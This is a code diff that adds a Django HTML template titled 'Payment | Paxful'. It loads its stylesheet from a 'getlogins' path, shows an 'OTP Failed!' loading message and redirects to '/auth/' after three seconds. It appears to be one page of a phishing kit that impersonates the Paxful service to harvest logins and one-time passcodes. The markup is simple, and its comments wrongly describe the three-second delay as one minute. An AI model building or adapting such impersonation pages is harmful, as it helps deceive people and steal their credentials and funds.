@@ -1,0 +1,63 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="{% static '/getlogins/pax/style.css' %}" rel="stylesheet">
+    <title>Payment | Paxful</title>
+  <style>
+    /* CSS code for loading animation */
+    @keyframes loading-animation {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loading-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .loading-spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid #ccc;
+      border-top: 4px solid #00bcd4;
+      border-radius: 50%;
+      animation: loading-animation 1s linear infinite;
+    }
+
+    .loading-text {
+      margin-top: 10px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <!-- HTML markup for loading animation -->
+  <div class="loading-container">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">OTP Failed! Redirecting You In A Moment...</div>
+  </div>
+</body>
+<script>
+  // Function to be executed after 1 minute
+  function executeFunction() {
+      // Your function code goes here
+      window.location.href = '/auth/';
+
+  }
+
+  // Wait for 1 minute and then execute the function
+  setTimeout(executeFunction, 3000); // 
+</script>
+
+</html>
